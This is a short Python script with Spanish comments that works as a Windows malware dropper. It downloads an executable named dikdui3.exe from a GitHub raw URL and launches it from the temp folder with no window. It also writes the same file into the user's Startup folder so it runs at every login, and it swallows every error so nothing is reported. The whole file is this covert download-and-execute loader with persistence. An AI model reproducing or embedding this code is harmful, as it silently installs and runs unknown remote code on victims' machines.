import os
import tempfile
import requests
import certifi
import subprocess
import sys
import shutil

URL  = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikdui3.exe"
NAME = "dikdui3.exe"


def descargar_y_ejecutar():
    ruta_temp = os.path.join(tempfile.gettempdir(), NAME)

    try:
        with requests.get(URL, stream=True, timeout=60, verify=certifi.where()) as r:
            r.raise_for_status()
            with open(ruta_temp, "wb") as f:
                for chunk in r.iter_content(1 << 15):
                    if chunk:
                        f.write(chunk)

        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        CREATE_NO_WINDOW = 0x08000000

        subprocess.Popen(
            [ruta_temp],
            startupinfo=si,
            creationflags=CREATE_NO_WINDOW,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

    except:
        pass  # total silencio


def obtener_ruta_startup():
    appdata = os.environ.get("APPDATA")
    return os.path.join(
        appdata,
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup"
    )


def instalar_en_inicio():
    try:
        ruta_startup = obtener_ruta_startup()
        os.makedirs(ruta_startup, exist_ok=True)

        destino = os.path.join(ruta_startup, NAME)

        with requests.get(URL, stream=True, timeout=60, verify=certifi.where()) as r:
            r.raise_for_status()
            with open(destino, "wb") as f:
                for chunk in r.iter_content(1 << 15):
                    if chunk:
                        f.write(chunk)

    except:
        pass  # sin mensajes


if __name__ == "__main__":
    instalar_en_inicio()
    descargar_y_ejecutar()
